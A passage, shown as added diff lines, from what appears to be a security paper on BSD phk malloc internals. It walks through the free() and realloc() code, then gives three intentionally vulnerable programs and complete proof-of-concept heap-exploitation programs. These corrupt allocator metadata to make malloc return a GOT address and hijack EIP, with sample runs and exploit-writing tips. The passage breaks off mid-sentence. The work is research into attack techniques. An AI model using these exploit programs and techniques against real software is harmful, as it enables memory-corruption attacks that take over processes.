+            wrtwarning("malloc() has never been called.\n");
+            return;
+        }
+        if (suicide)
+            return;
+
+eb] Then, the index in the page of the chunk designed by the ptr argument is
+    computed, and ifree() checks it is large enough to reference an entry in the
+    second part of the pages directory, and it is small enough to reference an
+    available page in the brk() region. If one of these conditions is false, a
+    warning message is issued and nothing is done:
+
+        if (idx < malloc_pageshift) {
+            wrtwarning("junk pointer, too low to make sense.\n");
+            return;
+        }
+        if (idx > last_idx) {
+            wrtwarning("junk pointer, too high to make sense.\n");
+            return;
+        }
+
+ec] At last, if the page contains a large chunk, it is freed by the lower layer
+    function free_pages(), otherwise, the free_bytes() function takes the job:
+
+        info = page_dir[idx];
+        if (info < MALLOC_MAGIC)
+            free_pages(ptr, idx, info);
+        else
+            free_bytes(ptr, idx, info);
+
+    eca] The free_bytes() function is responsible for chunks deallocation, but
+         also for the returning of empty pages to the lower level free_pages()
+         function. It first computes the index of the chunk in the page, and
+         checks the pointer really points to the beginning of a chunk, and that
+         this chunk is not already free. If one of these conditions is not met,
+         a warning is issued and nothing is done:
+
+             i = ((size_t)(uintptr_t)ptr & malloc_pagemask) >> info->shift;
+             if (((size_t)(uintptr_t)ptr & (info->size-1))) {
+                 wrtwarning("modified (chunk-) pointer.\n");
+                 return;
+             }
+             if (info->bits[i/MALLOC_BITS] & (1<<(i%MALLOC_BITS))) {
+                 wrtwarning("chunk is already free.\n");
+                 return;
+             }
+
+    ecb] If told to do so, the function sets all the freed chunk bytes to
+         MALLOC_JUNK:
+
+             if (malloc_junk)
+                 memset(ptr, SOME_JUNK, (size_t)info->size);
+
+    ecc] The chunk is then marked as free, and, if the page was full of
+         allocated chunks, it is reinserted in the appropriate linked list of
+         pages:
+
+             info->bits[i/MALLOC_BITS] |= 1<<(i%MALLOC_BITS);
+             info->free++;
+             mp = page_dir + info->shift;
+             if (info->free == 1) {
+                 mp = page_dir + info->shift;
+                 while (*mp && (*mp)->next && (*mp)->next->page < info->page)
+                     mp = &(*mp)->next;
+                 info->next = *mp;
+                 *mp = info;
+                 return;
+             }
+
+    ecd] If the page is not empty, free_bytes() returns:
+
+             if (info->free != info->total)
+                 return;
+
+    ece] Otherwise, it is removed from the appropriate list of pages:
+
+         while (*mp != info) {
+             mp = &((*mp)->next);
+         }
+         *mp = info->next;
+
+    ecf] The MALLOC_FIRST that was overwritten by malloc_make_chunks() in the
+         pages directory with the address of the pginfo structure describing the
+         page is restored:
+
+             page_dir[idx] = MALLOC_FIRST;
+
+    ecg] If the page handles medium-sized chunks, its pginfo structure is freed
+         by ifree(), and, whatever the page's role, the page is also freed by
+         ifree():
+
+             vp = info->page;            /* Order is important ! */
+             if(vp != (void*)info)
+                 ifree(info);
+             ifree(vp);
+
+                                   ==========
+
+free(void *ptr) algorithm
+
+fa] free() simply checks no concurrent call problem occured, or issues a
+    warning and does nothing:
+
+        if (malloc_active++) {
+            wrtwarning("recursive call.\n");
+            malloc_active--;
+            return;
+
+fb] Otherwise, it only calls ifree() to do the real job:
+
+        } else {
+            ifree(ptr);
+
+fc] and resets malloc_active:
+
+        malloc_active--;
+
+
+
+################################################################################
+
+                            Reallocation algorithms
+
+                                   ==========
+
+irealloc(void *ptr, size_t size) algorithm
+
+irealloc() is phk malloc's internal reallocation function. It is called for any
+chunk reallocation, and belongs to both the upper and lower layer, as it
+manipulates functions and data belonging to both of these layers. Simply put,
+the buffer will remain at the same place if it is a large chunk and the
+requested size rounded up to a multiple of the page size is unchanged, or if it
+is a medium-sized or tiny chunk and the requested size rounded up to a power of
+2 is unchanged. Otherwise, a new buffer is obtained through a call to imalloc(),
+and data is memcpy()ed from the old one to the new one.
+
+ga] It first computes the index in the pages directory of the page the chunk to
+    realloc() belongs to, and performs the same sanity checks ifree() performs
+    (suicide is 0, the index is that of an element of the second part of the
+    pages directory, the index is smaller than or equal to last_idx, the index
+    of the last page available to phk malloc in the brk() region). If the first
+    requirement is not met, abort() is called. If one of the other requirements
+    is not met, a warning is issued and 0 is returned:
+
+        if (suicide)
+            abort();
+        idx = ptr2idx(ptr);
+        if (idx < malloc_pageshift) {
+            wrtwarning("junk pointer, too low to make sense.\n");
+            return 0;
+        }
+        if (idx > last_idx) {
+            wrtwarning("junk pointer, too high to make sense.\n");
+            return 0;
+        }
+
+gb] If the chunk is a large chunk, irealloc() first checks the pointer really
+    points to the beginning of a page, otherwise it issues a warning and 0 is
+    returned. It then computes the current size of the chunk, and, if the
+    requested new size would not change the number of required pages and the
+    configuration does not force irealloc() to move the chunk to some other
+    place (it is not forced to by default), nothing is done:
+
+        mp = &page_dir[idx];
+        if (*mp == MALLOC_FIRST) {                  /* Page allocation */
+            if ((size_t)(uintptr_t)ptr & malloc_pagemask) {
+                wrtwarning("modified (page-) pointer.\n");
+                return 0;
+            }
+            for (osize = malloc_pagesize; *++mp == MALLOC_FOLLOW;)
+                osize += malloc_pagesize;
+            if (!malloc_realloc &&                  /* unless we have to, */
+              size <= osize &&                      /* .. or are too small, */
+              size > (osize - malloc_pagesize)) {   /* .. or can free a page, */
+                return ptr;                         /* don't do anything. */
+            }
+
+gc] Otherwise, if the chunk is a medium-sized or tiny chunk, irealloc() checks
+    the pointer is really set to the address of the beginning of a possible
+    chunk for the associated page, computes its index in the page, and checks it
+    is not already free. If one of these conditions is not met, a warning is
+    issued and 0 is returned. Then, if the new requested size would not change
+    the required chunk size, and if the configuration does not force phk malloc
+    to move the chunk to some other place (it is not forced to by default),
+    nothing is done:
+
+
+        } else if (*mp >= MALLOC_MAGIC) {           /* Chunk allocation */
+            if (((size_t)(uintptr_t)ptr & ((*mp)->size-1))) {
+                wrtwarning("modified (chunk-) pointer.\n");
+                return 0;
+            }
+            i = ((size_t)(uintptr_t)ptr & malloc_pagemask) >> (*mp)->shift;
+            if ((*mp)->bits[i/MALLOC_BITS] & (1<<(i%MALLOC_BITS))) {
+                wrtwarning("chunk is already free.\n");
+                return 0;
+            }
+            osize = (*mp)->size;
+            if (!malloc_realloc &&          /* Unless we have to, */
+              size < osize &&               /* ..or are too small, */
+              (size > osize/2 ||            /* ..or could use a smaller size, */
+              osize == malloc_minsize)) {   /* ..(if there is one) */
+                return ptr;                 /* ..Don't do anything */
+
+gd] Otherwise, ie. if the pointer to the chunk neither is MALLOC_FIRST nor is
+    larger than MALLOC_MAGIC, a warning is issued and 0 is returned:
+
+        } else {
+            wrtwarning("pointer to wrong page.\n");
+            return 0;
+        }
+
+ge] At last, if something still needs to be done, a new chunk of the requested
+    size is imalloc()ed, and the appropriate number of bytes is copied from the
+    old buffer to the new one. This number of bytes is either the new requested
+    size or the size of the old chunk. Then, the old chunk is freed by ifree(),
+    and the address of the newly allocated chunk is returned to the caller:
+
+        p = imalloc(size);
+        if (p) {
+            if (!size || !osize)
+                ;
+            else if (osize < size)
+                memcpy(p, ptr, osize);
+            else
+                memcpy(p, ptr, size);
+            ifree(ptr);
+        }
+        return p;
+
+                                   ==========
+
+realloc(void *ptr, size_t size)
+
+Now, realloc() only needs to perform a few checks and call irealloc() for the
+real job.
+
+ha] First, the usual check for non concurrent calls is performed. If a
+    concurrent call is detected, a warning is issued and 0 is returned:
+
+        if (malloc_active++) {
+            wrtwarning("recursive call.\n");
+            malloc_active--;
+            THREAD_UNLOCK();
+            return (0);
+        }
+
+hb] Then, if the pointer is non 0 and phk malloc has not been properly
+    initialized, a warning is issued and 0 is returned:
+
+        if (ptr && !malloc_started) {
+            wrtwarning("malloc() has never been called.\n");
+            ptr = 0;
+        }
+
+hc] If the pointer is zero but phk malloc has not been properly initialized, the
+    initialization is performed by malloc_init():
+
+        if (!malloc_started)
+            malloc_init();
+
+hd] If the new requested size is 0 and phk malloc is configured to behave as
+    System V implementations (not the default), the buffer is freed thanks to
+    ifree(), and 0 will be returned:
+
+        if (malloc_sysv && !size) {
+            ifree(ptr);
+            r = 0;
+
+he] Otherwise, if the pointer is 0, the address of a chunk of the requested size
+    is obtained through a call to imalloc(), and will be returned:
+
+        } else if (!ptr) {
+            r = imalloc(size);
+
+hf] Otherwise, irealloc() is called to do the job:
+
+        } else {
+            r = irealloc(ptr, size);
+
+hg] At last, malloc_active is reset, and, depending on malloc configuration, if
+    no memory could be allocated, the error may be reported (not the default):
+
+        if (r == NULL && (size != 0 || !malloc_sysv)) {
+            if (malloc_xmalloc)
+                wrterror("out of memory.\n");
+            errno = ENOMEM;
+        }
+
+
+
+################################################################################
+
+                 Sample heap corruption exploitation techniques
+
+A few ideas to exploit BSD heap corruptions are provided here, with sample
+trivial vulnerable programs and proof of concepts. In order to keep this
+presentation simple, short, and clear, the proof of concept programs do not
+cause the vulnerable program to jump into a shellcode, they only make it jump
+at an obviously attacker-controlled address (ie. they cause EIP to be set to
+0x42424242). For the same reason, they do not handle all possible cases, but
+will work most of the time.
+
+Also, the vulnerable programs have a builtin information leak (it even is
+a feature, not a bug :=), so that the attacking program does not need to
+brute force any parameter. Believe it or not, even without this information
+leak, the vulnerable programs could be exploited, either by brute forcing
+the unknown parameters or by monitoring the process RSS (see appendix A) to
+know when new memory pages are allocated and thus being able to simulate the
+internal memory allocator state and predict where the chunks are allocated. Last
+restriciton: the provided proof of concepts do not work against OpenBSD, because
+the GOT is located at addresses whose most significant byte is 0. However, it
+would be possible to overwrite a stack pointer instead of the GOT, as will be
+demonstrated in the section about a real life BSD heap corruption exploitation.
+
+Before starting, the reader needs to know the following details about phk malloc
+on Intel i86 (more detail is provided in appendix B):
+
+  * tiny chunks are 16 (0x10) and 32 (0x20) bytes chunks
+  * medium-sized chunks range from 64 (0x40) to 2048 (0x1000/2) bytes, inclusive
+  * a memory page is 4096 (0x1000) bytes long
+  * pginfo structures range between 20 and 32 bytes (remember the bits field has
+    a variable width), and are stored in 32 bytes chunks, except for 16 bytes
+    chunks pages, whose pginfos are 48 bytes long
+  * pgfree structures are 20 bytes long
+
+                                   ==========
+
+A simple technique may be used to exploit basic heap buffer overflows. It simply
+requires to overwrite the page, shift, and bits fields of a pginfo structure,
+then the attacker controls the return value of the next dynamic allocation of
+the appropriate size. This technique requires the ability to create a gap in
+the heap: first, a chunk that has the size of a struct pginfo is allocated,
+then another chunk, whose only role is to force the allocator to create a new
+page and thus place a pginfo structure immediately after the first chunk. Then,
+the first chunk is freed, and immediately allocated again, overflowed, and the
+freshly allocated pginfo structure is overwritten. Next call to malloc() returns
+whatever the attacker wants and may be used to erase a saved EIP, a GOT entry,
+or whatever.
+
+The following vulnerable program and proof of concept illustrate this technique.
+
+Here is the source code for vuln1.c:
+
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
+
+int main() {
+  char buf[8192];
+  unsigned int i;
+  unsigned int j;
+  char *p;
+  char *q;
+
+  while (fgets(buf,sizeof(buf),stdin)!=NULL) {
+    if(buf[0]=='-') {   /* free */
+      j=strtoul(buf+1,&p,0);
+      if (*p!='\n' && *p!='\0') {
+        fputs("WTF?\n",stderr);
+        exit(42);
+      }
+      printf("free(%p)\n",(void *)j);
+      fflush(stdout);
+      free((void *)j);
+    } else {            /* malloc */
+      j=strtoul(buf,&p,0);
+      if (p==buf) {
+        fputs("WTF?\n",stderr);
+        exit(42);
+      }
+      while (*p==' ' || *p=='\t') {
+        p++;
+      }
+      printf("malloc(0x%X) ",j);
+      fflush(stdout);
+      q=malloc(j);
+      printf("strcpy(%p,[%u bytes])\n",q,strlen(p));
+      fflush(stdout);
+      strcpy(q,p);
+    }
+  }
+
+  return 0;
+}
+
+And the source code for poc1.c:
+
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+
+#define VULN "vuln1"
+
+#define GOT_ADDR 0x08049c00
+
+FILE *client_input;
+FILE *client_output;
+
+unsigned int do_malloc(unsigned int size,char *data) {
+  char buf[8192];
+  unsigned int i;
+  unsigned int j;
+
+  if (data==NULL) {
+    fprintf(client_input,"0x%X \n",size);
+  } else {
+    fprintf(client_input,"0x%X %s\n",size,data);
+  }
+  fflush(client_input);
+  if (fgets(buf,sizeof(buf),client_output)==NULL) {
+    perror("fgets");
+    exit(42);
+  }
+  j=0;
+  for (i=0;buf[i];i++) {
+    if (buf[i]=='0' && (buf[i+1]=='x' || buf[i+1]=='X')) {
+      if (!j) {
+        j++;
+        continue;
+      }
+      i=(unsigned int)strtoul(buf+i,NULL,0);
+      printf("malloc(0x%X) -> 0x%X\n",size,i);
+      fflush(stdout);
+      return i;
+    }
+  }
+  fprintf(stderr,"WTF?\n");
+  exit(42);
+  return 0;
+}
+
+void do_free(unsigned int address) {
+  char buf[1024];
+
+  fprintf(client_input,"-0x%X\n",address);
+  fflush(client_input);
+  if (fgets(buf,sizeof(buf),client_output)==NULL) {
+    perror("fgets");
+    exit(42);
+  }
+  printf("free(0x%X)\n",address);
+  fflush(stdout);
+}
+
+#define PUT32(addr,val) do { \
+                          (addr)[0]=(val)&0xff; \
+                          (addr)[1]=((val)>>8)&0xff; \
+                          (addr)[2]=((val)>>16)&0xff; \
+                          (addr)[3]=((val)>>24)&0xff; \
+                        } while (0);
+
+void exploit_vuln(unsigned int write_shellcode_addr_here) {
+  unsigned char buf[0x1000/2+16*3];
+  unsigned int i;
+
+  /* start a new page containing only two chunks */
+  do_malloc(0x1000/2,NULL);
+
+  /* start a new page of tiny chunks, it is allocated right after the first
+     page, the page field of its pginfo structure will be erased later */
+  i=do_malloc(0x10,NULL)+0x10;
+  i&=0xfff;
+  write_shellcode_addr_here-=i;
+  printf("new page field will be 0x%X\n",write_shellcode_addr_here);
+
+  /* allocate the second chunk of the first page, and overflow it by 8 bytes,
+     this erases the next and page fields of the pginfo structure of the 16
+     bytes chunks page */
+  memset(buf,0x90,0x1000/2+4);
+  PUT32(buf+0x1000/2+4,write_shellcode_addr_here);
+  buf[0x1000/2+8]=0;
+  do_malloc(0x1000/2,buf);
+
+  /* next malloc(16) returns the GOT address */
+  do_malloc(16,"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB");
+}
+
+int main() {
+  char *call_argv[]={VULN,NULL};
+  int input[2];
+  int output[2];
+
+  if (pipe(input)<0) {
+    perror("pipe");
+    exit(42);
+  }
+
+  if (pipe(output)<0) {
+    perror("pipe");
+    exit(42);
+  }
+
+  switch (fork()) {
+    case -1:
+      perror("fork");
+      exit(42);
+    case 0:
+      close(input[1]);
+      close(output[0]);
+      dup2(input[0],STDIN_FILENO);
+      dup2(output[1],STDOUT_FILENO);
+      execve(VULN,call_argv,NULL);
+      perror("execve");
+      exit(42);
+    default:
+      close(input[0]);
+      close(output[1]);
+      client_input=fdopen(input[1],"w");
+      if (client_input==NULL) {
+        perror("fdopen");
+        exit(42);
+      }
+      client_output=fdopen(output[0],"r");
+      if (client_output==NULL) {
+        perror("fdopen");
+        exit(42);
+      }
+    exploit_vuln(GOT_ADDR);
+  }
+
+  return 0;
+}
+
+And a sample usage:
+
+$ make vuln1 poc1
+cc -O2   -o vuln1 vuln1.c
+cc -O2   -o poc1 poc1.c
+$ ./poc1
+malloc(0x800) -> 0x804D000
+malloc(0x10) -> 0x804E030
+new page field will be 0x8049BC0
+malloc(0x800) -> 0x804D800
+malloc(0x10) -> 0x8049C00
+$ gdb vuln1 vuln1.core
+[...]
+(gdb) info reg
+[...]
+eip            0x42424242       0x42424242
+[...]
+
+                                   ==========
+
+Now, what if we only have an off-by-one with a nul byte? The page field of a
+pginfo structure can no longer be erased. A variant of the previous technique
+needs to be used, but the basic idea remains the same. First, a pginfo-sized
+chunk needs to be allocated. Then, a page containing medium-sized chunks is
+started. Its pginfo structure is placed by phk malloc in the chunk following
+the aforementioned pginfo-sized chunk. The medium chunks page is completed, and
+another one, handling the same kind of chunks, is started. Then, one chunk from
+the first medium-sized chunks page is freed, the next field of the associated
+pginfo structure thus points to the pginfo structure associated with the second
+medium-sized chunks page. At last, the first pginfo-sized chunk is freed, and
+immediately reallocated and overflowed. This breaks the next field of the first
+medium-sized chunks page, and enables an attacker to introduce a crafted element
+in the list of pginfo structures. Thus, the return values of subsequent calls to
+malloc() are under control.
+
+Here is the source code for vuln2.c:
+
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
+
+int main() {
+  char buf[8192];
+  unsigned int i;
+  unsigned int j;
+  char *p;
+  char *q;
+
+  while (fgets(buf,sizeof(buf),stdin)!=NULL) {
+    if(buf[0]=='-') {   /* free */
+      j=strtoul(buf+1,&p,0);
+      if (*p!='\n' && *p!='\0') {
+        fputs("WTF?\n",stderr);
+        exit(42);
+      }
+      printf("free(%p)\n",(void *)j);
+      fflush(stdout);
+      free((void *)j);
+    } else {            /* malloc */
+      j=strtoul(buf,&p,0);
+      if (p==buf) {
+        fputs("WTF?\n",stderr);
+        exit(42);
+      }
+      while (*p==' ' || *p=='\t') {
+        p++;
+      }
+      if (strlen(p)>j) {
+        fputs("Hey, this is only an off by one! Return to poc1 for this.\n",
+              stderr);
+        exit(42);
+      }
+      printf("malloc(0x%X) ",j);
+      fflush(stdout);
+      q=malloc(j);
+      printf("strcpy(%p,[%u bytes])\n",q,strlen(p));
+      fflush(stdout);
+      strcpy(q,p);
+    }
+  }
+
+  return 0;
+}
+
+poc2.c reuses most of poc1.c code, only the exploit_vuln() function is modified:
+
+void exploit_vuln(unsigned int write_shellcode_addr_here) {
+  unsigned char fake_pginfo[0x20];
+  unsigned int first_medium_chunk;
+  unsigned int first_pginfo_addr;
+  unsigned int second_pginfo_addr;
+
+  /* prepare a 32 bytes chunks page */
+  first_pginfo_addr=do_malloc(0x20,NULL)+0x20;
+
+  /* allocate a page that contains only 2 chunks, its pginfo has address
+     first_pginfo_addr */
+  first_medium_chunk=do_malloc(0x1000/2,NULL);
+
+  /* leak memory until the next 32 bytes chunk is at 0x?????100 */
+  while ((do_malloc(0x20,NULL)+0x20) & 0xff);
+
+  /* prepare and leak a fake pginfo structure */
+    /* next field does not matter */
+    PUT32(fake_pginfo,0x41414141);
+    /* page field: the address of data that will be overwritten */
+    PUT32(fake_pginfo+4,GOT_ADDR);
+    /* size and shift fields: do not matter as long as the first chunk
+       of the page is available */
+    PUT32(fake_pginfo+8,0x43434444);
+    /* free and total fields: do not matter as long as free > 1 */
+    PUT32(fake_pginfo+12,0x46464545);
+    /* bits field: simply pretend the first chunk is available */
+    PUT32(fake_pginfo+16,0x47474701);
+  second_pginfo_addr=do_malloc(0x20,fake_pginfo)+0x20;
+
+  /* complete the 2048 bytes chunks page and start another one, whose
+     pginfo will have address second_pginfo_addr */
+  do_malloc(0x1000/2,NULL);
+  do_malloc(0x1000/2,NULL);
+
+  /* free a chunk in the first 2048 bytes chunks page, so that the
+     next field of its pginfo points to second_pginfo_addr */
+  do_free(first_medium_chunk);
+
+  /* free the chunk preceding the pginfo of the first 2048 bytes chunks
+     page, and overflow it, this breaks the pginfo's next field */
+  do_free(first_pginfo_addr-0x20);
+  do_malloc(0x20,"0123456789abcdef0123456789abcde");
+
+  /* get rid of the first 2048 bytes chunks page */
+  do_malloc(0x1000/2,NULL);
+
+  /* may the GOT rest in peace */
+  do_malloc(0x1000/2,"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB");
+}
+
+Sample run:
+
+$ make vuln2 poc2
+cc -O2   -o vuln2 vuln2.c
+cc -O2   -o poc2 poc2.c
+$ ./poc2
+malloc(0x20) -> 0x804B060
+malloc(0x800) -> 0x8051000
+malloc(0x20) -> 0x804B0A0
+malloc(0x20) -> 0x804B0C0
+malloc(0x20) -> 0x804B0E0
+malloc(0x20) -> 0x804B100
+malloc(0x800) -> 0x8051800
+malloc(0x800) -> 0x8052000
+free(0x8051000)
+free(0x804B060)
+malloc(0x20) -> 0x804B060
+malloc(0x800) -> 0x8051000
+malloc(0x800) -> 0x8049E68
+$ gdb vuln2 vuln2.core
+[...]
+(gdb) info reg
+[...]
+eip            0x42424242       0x42424242
+
+                                   ==========
+
+Now, what if we moreover can not cause the vulnerable program to allocate
+anything else than tiny buffers? The preceding technique doesn't work anymore on
+little endian architectures, because on such architectures, a pginfo structure
+describing a tiny chunks page starts with the least significant byte of the
+next field. This field is either NULL or a pointer to another pginfo structure
+describing a page containing the same kind of chunks, ie. tiny chunks. Such a
+structure is necessarily located at the beginning of a page, thus the least
+significant byte of its address is a nul byte. In either case, overwriting this
+byte with a 0 does not change anything.
+
+Simply put, pginfo structures can no longer be broken. However, a pgfree
+structure may start with a non zero byte, if its next field is not NULL. To
+exploit such a vulnerability, two non adjacent pages will have to be freed,
+so that two pgfree structures are allocated (or one will be allocated and one
+will occupy the px cache). Then, if the chunk preceding the head of the doubly
+linked free pages list is freed, and immediately allocated again and overflowed,
+this will break the next field of the first pgfree structure, and an attacker
+crafted element will be introduced in the doubly linked list of free pages, and
+the attacker will eventually control the return value of subsequent malloc()
+calls. Sounds cool, heh? But this is only pure theory. I just told you: fear the
+infamous px cache. Really.
+
+The first time a page is freed, no pgfree structure is allocated if the px
+cache is not empty (and, most of the time, it is not empty). The cache will be
+used to store the new pgfree. The problem is that the location of this cache is
+unknown, and it is thus impossible to force the vulnerable program to free the
+preceding chunk. Moreover, in real life exploitation scenarios, the attacker
+can rarely free arbitrary chunks. They are most of the time only able to free
+certain particular chunks. To conclude, a technique must be developed to move
+the px cache. Assuming the px cache can be placed wherever the attacker wants,
+the technique explained in the preceding paragraph may be employed.
+
+If px points to a free area where a pgfree structure can be stored, a memory
+page needs to be freed, and the associated pgfree structure will use this cache.
+Then, px will be set to NULL. If a second, non-adjacent page is freed, a chunk
+will be allocated to store the associated pgfree structure. Now, if a new page
+is allocated, the head of the free pages list (ie. the pgfree structure
+describing the lowest address free page) will become unused, and px will point
+at it. This yields a technique to move the px cache (assuming the free pages
+list is initially empty):
+
+  1 - allocate a memory page, further called page 1
+  2 - allocate another page, whose only purpose is to have something between
+      page 1 and page 2
+  3 - allocate a third page, called page 2
+  4 - free page 2, the associated pgfree structure will occupy the px cache if
+      px is not NULL, or a new pgfree structure will be allocated with a call to
+      imalloc(), and px will be set to NULL if it wasn't already
+  5 - free page 1, a new chunk will be allocated to store the associated pgfree
+      structure, and this pgfree structure will become the head of the doubly
+      linked free pages list
+  6 - allocate a memory page: the head of the free pages list will be used, ie.
+      page 1 will be used, and its pgfree structure will become useless, it will
+      thus become the new px cache
+
+The drawback of this technique is that, depending on the initial state of the
+px cache, the step 4 may or may not cause the *allocation* of a new pgfree
+structure. This makes the task of predicting the exact address of further
+allocated chunks, in particular, the exact address of the new px cache, hard
+(two cases have to be distinguished). The counterpart is that after applying
+theses steps, the state and position of the px cache are approximately known.
+This drawback is a minor inconvenience, provided that anyway, very few real life
+remote exploitation scenarios include the prediction of exact chunk addresses.
+Fine details need most of the time to be brute forced. Moreover, specific
+variants of this technique most often solve this indetermination.
+
+Even if the above technique doesn't sound that realistic, it has however already
+been successfully employed in a remote exploit.
+
+Here comes the source code for vuln3.c:
+
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
+
+int main() {
+  char buf[8192];
+  unsigned int i;
+  unsigned int j;
+  char *p;
+  char *q;
+
+  while (fgets(buf,sizeof(buf),stdin)!=NULL) {
+    if(buf[0]=='-') {   /* free */
+      j=strtoul(buf+1,&p,0);
+      if (*p!='\n' && *p!='\0') {
+        fputs("WTF?\n",stderr);
+        exit(42);
+      }
+      printf("free(%p)\n",(void *)j);
+      fflush(stdout);
+      free((void *)j);
+    } else {            /* malloc */
+      j=strtoul(buf,&p,0);
+      if (p==buf || j>32) {
+        fputs("WTF?\n",stderr);
+        exit(42);
+      }
+      while (*p==' ' || *p=='\t') {
+        p++;
+      }
+      if (strlen(p)>j) {
+        fputs("Hey, this is only an off by one! Return to poc1 for this.\n",
+              stderr);
+        exit(42);
+      }
+      printf("malloc(0x%X) ",j);
+      fflush(stdout);
+      q=malloc(j);
+      printf("strcpy(%p,[%u bytes])\n",q,strlen(p));
+      fflush(stdout);
+      strcpy(q,p);
+    }
+  }
+
+  return 0;
+}
+
+poc3.c reuses most of poc1.c code, only the exploit_vuln() function is modified:
+
+void exploit_vuln(unsigned int write_shellcode_addr_here) {
+  unsigned char fake_pgfree[0x20];
+  unsigned int addr_16;
+  unsigned int addr_32;
+  unsigned int pgfree_addr;
+  unsigned int force_pgfree_there;
+  unsigned int i;
+
+  /* first, fill the first 32 bytes chunks page (remember malloc_init does a
+   * px=imalloc(sizeof(struct pgfree)) */
+  while ((do_malloc(0x20,NULL)+0x20) & 0xfff);
+
+  for (i=1;i<5;i++) {
+    while ((do_malloc(0x20,NULL)+0x20) & 0xfff);
+  }
+
+  /* force the px cache to contain an available slot if it does not */
+  addr_32=do_malloc(0x20,NULL);
+  do_free(addr_32);
+  do_malloc(0x20,NULL);
+
+  /* then, create one page for 16 bytes chunks */
+  addr_16=do_malloc(0x10,NULL);
+
+  /* then, complete the 32 bytes chunks page */
+  while ((do_malloc(0x20,NULL)+0x20) & 0xfff);
+
+  /* start and complete a new 32 bytes chunks page */
+  do_malloc(0x20,NULL);
+  pgfree_addr=do_malloc(0x20,NULL); /* later, we will put a pgfree here */
+  while ((do_malloc(0x20,NULL)+0x20) & 0xfff);
+
+  /* start a new 32 bytes chunks page */
+  addr_32=do_malloc(0x20,NULL);
+
+  /* free pgfree_addr so that a pgfree will be allocated there */
+  do_free(pgfree_addr);
+
+  /* free the two pages, a pgfree is created where the px cache pointed,
+     and another one at pgfree_addr
+     the second pgfree is free()d first, so that the px cache is changed
+     where we want it to be */
+  do_free(addr_32);
+  /* px cache is empty now */
+  do_free(addr_16);
+
+  /* allocate a page, this will move the px cache */
+  i=do_malloc(0x20,NULL) & 0xfff;
+  printf("px cache now at: 0x%X\n",pgfree_addr);
+
+  /* leak memory until next 32 bytes chunk is at 0x?????100 */
+  while ((do_malloc(0x20,NULL)+0x20) & 0xff);
+
+  /* build and leak a fake pgfree struct */
+    /* next field does not matter */
+    PUT32(fake_pgfree,0x41414141);
+    /* prev field does not matter */
+    PUT32(fake_pgfree+4,0x41414141);
+    /* page field is the address we want to overwrite */
+    PUT32(fake_pgfree+8,GOT_ADDR-i);
+    /* end field does not matter */
+    PUT32(fake_pgfree+12,0x41414141);
+    /* size field does not matter */
+    PUT32(fake_pgfree+16,0x41414141);
+    /* bits field: pretend starting chunks are free */
+    PUT32(fake_pgfree+20,0x01);
+  printf("fake pgfree at: 0x%X\n",do_malloc(0x20,fake_pgfree));
+
+  /* next pgfree will be there */
+  force_pgfree_there=do_malloc(0x20,NULL);
+
+  /* complete the page */
+  while ((do_malloc(0x20,NULL)+0x20) & 0xfff);
+
+  /* start a new 16 bytes chunks page */
+  addr_16=do_malloc(0x10,NULL);
+
+  /* leak a complete 32 bytes chunks page */
+  while ((do_malloc(0x20,NULL)+0x20) & 0xfff);
+
+  /* then, create one page for 32 bytes chunks */
+  addr_32=do_malloc(0x20,NULL);
+
+  /* free force_pgfree_there so that a pgfree will be allocated there */
+  do_free(force_pgfree_there);
+
+  /* free the two pages, the pgfree will be at pgfree_addr and
+     force_pgfree_there */
+  /* we want the head of the list at pgfree_addr, we thus free the first
+     page first */
+  do_free(addr_16);
+  do_free(addr_32);
+
+  /* overflow a buffer located before pgfree_addr, so that the pgfree list is
+     broken */
+  do_free(pgfree_addr-0x20);
+  do_malloc(0x20,"0123456789012345678901234567890");
+
+  /* get rid of the first free page */
+  do_malloc(0x10,NULL);
+
+  /* gently fuck the GOT with a chainsaw and tabasco */
+  for (i=0;i<31;i++) {
+    do_malloc(0x20,"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB");
+  }
+}
+
+Sample run:
+
+$ make vuln3 poc3
+cc -O2   -o vuln3 vuln3.c
+cc -O2   -o poc3 poc3.c
+$ ./poc3
+[...]
+malloc(0x20) -> 0x8059FC0
+malloc(0x20) -> 0x8059FE0
+malloc(0x20) -> 0x805A020
+free(0x8056120)
+free(0x8058030)
+free(0x805A020)
+free(0x8057020)
+malloc(0x20) -> 0x8057020
+malloc(0x10) -> 0x8058030
+malloc(0x20) -> 0x8049F08
+fgets: Undefined error: 0
+$ gdb vuln3 vuln3.core
+[...]
+(gdb) info reg
+[...]
+eip            0x42424242       0x42424242
+[...]
+
+
+
+################################################################################
+
+                           Tips, tricks, and caveats
+
+A few tricks I thought of when writing exploits and problems I ran into are
+explained here, in no particular order.
+
+                                   ==========
+
+RSS monitoring:
+
+  When exploiting vulnerabilities based on heap corruption, one of the most
+  common problems is that the exploit writer needs to know the address (or at
+  least the offset in the page) of certain tiny and medium-sized chunks. One
+  way to do so is to force the vulnerable program to allocate more and more
+  memory until a new page is allocated. When this happens, one can compute the
+  offset of the last allocated chunk in its page. Sample process size monitoring
+  code for BSD is provided in Appendix A. Of course, this technique only applies
+  to local exploits development.
+
+                                   ==========
+
+Overflows of uninitialized buffers:
+
+  Because the first page of the heap is the page following the last page of the
+  BSS, it may be possible, in some circumstances, to exploit overflows of
+  buffers located in the uninitialized data region of a program.
+
+  Guessing what to write in the beginning of the heap is not that hard, because
+  the first bytes of the heap are well known. In fact, the first call to
+  imalloc() is done by malloc_init() to initialize the px cache. Consequently,
+  the first page of the heap is necessarily a page of chunks whose size is
+  sizeof(struct pgfree) rounded up to a power of 2. On most architectures, this
+  means the first page of the heap is a tiny chunks pages, and the first bytes
+  of the heap are simply the associated pginfo structure.
+
+                                   ==========
+
+bits field madness:
+
+  Before free_bytes() marks a chunk as free, it checks the chunk is not already
+  free. If it already is, the function issues a warning and does nothing. This
+  is sometimes a problem when inserting crafted elements in the free pages
+  doubly linked list, because the index of the chunk in the page is computed by
+  free_bytes() relative to what should be the start of the page, ie. the address
+  of the chunk rounded down to a multiple of the page size, instead of the
+  page field of the pginfo structure.
+
+  If the beginning of the page is not aligned on a multiple of the page size
+  (which will frequently be the case, because most of the time, it is hard to
